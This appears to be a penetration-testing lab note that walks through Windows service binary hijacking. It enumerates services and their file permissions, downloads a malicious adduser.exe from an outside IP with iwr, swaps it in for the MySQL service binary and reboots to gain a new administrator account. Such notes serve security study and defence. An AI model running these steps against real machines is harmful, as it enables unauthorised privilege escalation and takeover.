# Service Binary Hijacking

Each Windows service has an associated binary file that is executed on startup. If these binary files aren't properly secured, a user can replace it with malicious code.

For example, a user installs an application and makes it a Windows service but accidentally allows Read Write (RW) permissions for all users. We can replace this application with a malicious binary, and restart the service, or restart the system system and the malicious binary will execute.

***

## Enumerating Services

To get a list of installed Windows services we can choose a variety of different tools. **(Get-Service, Get-Ciminstance, GUI services.msc)**.&#x20;

### Get-Ciminstance

_<mark style="color:red;">**NOTE:**</mark>_ Get-CimInstance and Get-Service will return "Permission denied" if using WinRM. A RDP session will fix this on a non-administrative user.

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
...
```

#### What we're looking for

We're looking for services that are installed in locations other than **C:\Windows\System32.** These applications are **user installed.**  For example**: C:\xampp\\.**

## Enumerating Permissions

Once we've enumerated the installed service and found one of interest, we can view the permissions.  We can use tools like: _**icacls**_ Windows utility or the PowerShell Cmdlet _**Get-ACL**_

| MASK | PERMISSIONS             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

### **icacls - Check Permissions of service**

```
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```

**Here we see the "Users" group has Full access to modify the binary.**&#x20;

## Transfer Malicious Binary - iwr

Our malicious binary creates a new user and adds it to Adminstrators group

```
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
```

## Move Malicious Binary to Service - Move

```
# Move target binary out of directoy.

PS> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

# Move malicious binary & rename to original.

PS> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

## Restart Service

If we have permissions on the service we can restart the service with `Restart-Service`, otherwise see below.

```
Restart-Service -name "ServiceName With Malicious exe"
```

## Restart

We'll need to restart the computer since most services are protected by Admistrators.&#x20;

```
PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

We're able to restart the system.

_**Shutdown Computer:**_

```
PS C:\Users\dave> shutdown /r /t 0 
```

## Verify Exploit

```
PS> Get-LocalGroupMember administrators

User        CLIENTWK220\Admin            Local
User        CLIENTWK220\evil_admin       Local
```
